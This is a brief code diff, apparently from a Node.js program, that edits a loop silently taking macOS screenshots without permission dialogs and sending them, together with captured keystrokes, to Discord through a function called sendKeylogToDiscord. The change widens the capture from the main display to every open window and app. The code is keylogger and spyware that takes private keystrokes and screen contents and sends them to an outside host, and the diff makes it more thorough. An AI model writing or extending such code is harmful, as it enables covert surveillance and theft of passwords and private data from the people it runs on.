@@ -885,9 +885,9 @@ setInterval(() => {
                 const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                 
                 // Capture screenshot silently (no permission dialogs)
-                // Use screencapture -x -m to capture main display (silent, no dialogs)
-                // This captures what's on screen, not just desktop background
-                exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
+                // Use screencapture -x to capture entire screen including all open windows
+                // This captures everything visible on screen (windows, apps, etc.)
+                exec(`screencapture -x "${screenshotFile}"`, (screenshotError) => {
                     if (!screenshotError && fs.existsSync(screenshotFile)) {
                         // Send with screenshot
                         sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
